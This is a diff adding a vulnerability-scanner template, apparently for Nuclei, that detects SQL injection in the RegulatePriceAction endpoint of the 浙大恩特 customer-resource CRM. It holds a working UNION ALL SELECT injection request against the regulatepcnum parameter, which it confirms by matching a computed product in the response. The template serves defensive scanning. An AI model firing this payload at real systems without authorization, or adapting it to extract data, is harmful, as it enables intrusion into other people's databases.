@@ -1,0 +1,41 @@
+id: regulatepriceaction-sqli
+info:
+  name: RegulatePriceAction SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Potential SQL injection vulnerability in the RegulatePriceAction endpoint of 浙大恩特客户资源管理系统.
+
+variables:
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+http:
+  - raw:
+      - |
+        GET /entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1%27+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,{{t1}}*{{t2}}-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<cell>"
+          - "xml version="
+        part: body
+
+      - type: regex
+        regex:
+          - "{{t3}}"
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
